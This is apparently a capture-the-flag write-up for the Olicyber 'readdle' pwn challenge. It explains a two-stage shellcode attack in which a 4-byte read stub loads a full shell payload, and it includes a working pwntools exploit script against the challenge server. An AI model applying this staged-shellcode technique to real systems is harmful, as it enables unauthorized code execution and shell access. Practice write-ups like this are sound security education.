---
title: "readdle — Two-Stage Shellcode via Stub Read Gadget"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "shellcode", "staged-exploit", "pwntools"]
difficulty: "intermediate"
summary: "Inject a 4-byte stub shellcode that calls read to pull a full shell payload into the same buffer, then jump to it — bypassing the initial 4-byte size constraint on the first write."
---

## The Challenge

The binary reads a shellcode payload at startup but limits the first write to 4 bytes. That is not enough for any useful shellcode — `shellcraft.sh()` is much larger. But a 4-byte `syscall` stub is enough to call `read` and receive more data.

## Approach

`mov dh, 100; syscall` is exactly 4 bytes. At the point it executes, registers are in a state where:

- `rax = 0` (fresh from a prior `read` or `write` syscall return)
- `rdi = 0` (stdin)
- `rsi` points at the buffer where the stub was written

So `syscall` calls `sys_read(0, buffer, rdx)` where `rdx = 0x6400` after `mov dh, 100` (sets the high byte of DX to 100, giving 25600 bytes — plenty). This second read receives the actual full shellcode and drops it at the same address where the stub lives.

Then the full `shellcraft.amd64.linux.sh()` shellcode executes and gives a shell.

The initial send adds 4 bytes of `A` padding before the full shellcode in the second send because `rsi` points at the start of the buffer and the stub occupies the first 4 bytes — the shellcode needs to start at offset 4.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux', endian='little')
SHELLCODE = """
mov dh, 100
syscall
"""
shell = asm(SHELLCODE)
shellcode = asm(shellcraft.amd64.linux.sh())
assert len(shell) <= 4, len(shell)
if args.REMOTE:
    r = remote("readdle.challs.olicyber.it", 10018)
else:
    r = gdb.debug("./readdle", """
        b *main+260
        continue
    """)

r.recvuntil(b'): ')
r.send(shell)
r.sendline(b'A' * 4 + shellcode)
r.interactive()
```

`asm(SHELLCODE)` assembles the 4-byte stub and the `assert` guards that it fits in the constraint. After the binary calls our stub: it jumps back through `sys_read`, which reads `b'A'*4 + shellcode` into the same buffer. The 4 `A` bytes overwrite the stub (no longer needed), and the shellcode executes starting at byte 4 where execution resumes.

## What I Learned

Staged shellcode is the answer when the injection window is smaller than a useful payload. A minimal `read` stub — two instructions, four bytes — is enough to upgrade a tiny write window into full shellcode execution. The key is understanding the register state at the point the stub runs so you know which `sys_read` argument (the buffer pointer) is already set correctly for free.
